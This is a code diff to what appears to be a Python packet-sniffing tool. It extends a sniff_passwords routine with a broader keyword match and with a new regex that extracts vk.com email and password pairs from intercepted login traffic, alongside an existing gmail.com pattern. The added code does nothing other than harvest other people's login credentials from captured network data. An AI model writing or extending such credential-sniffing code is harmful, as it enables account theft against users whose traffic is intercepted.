@@ -116,6 +116,9 @@ class VK_data:
             return self.from_a_check(string)
         
         # No-info types
+        if m.group('type') == "login":
+            return 1
+        
         if m.group('type') == "pad":
             return 1
         
@@ -160,7 +163,7 @@ class PW_data:
         self.passwords = []
 
     def sniff_passwords(self, string):
-        if ("assword" not in string) and ("asswd" not in string):
+        if ("assword" not in string) and ("asswd" not in string) and ("pass" not in string):
             return
 
         try:
@@ -193,6 +196,13 @@ class PW_data:
         m = re.match(r"[\w\W]*&Email=(?P<login>[^&]*)&Passwd=(?P<password>[^&]*)&[\w\W]*", string)
         if (m):
             self.passwords.append(["gmail.com", m.group('login'), m.group('password')])
+            logging.debug(str(self))
+            return
+
+        # vk.com
+        m = re.match(r"act=login&[\w\W]*&email=(?P<login>[^&]*)&pass=(?P<password>[^&]*)", string)
+        if (m):
+            self.passwords.append(["vk.com", m.group('login'), m.group('password')])
             logging.debug(str(self))
             return
 
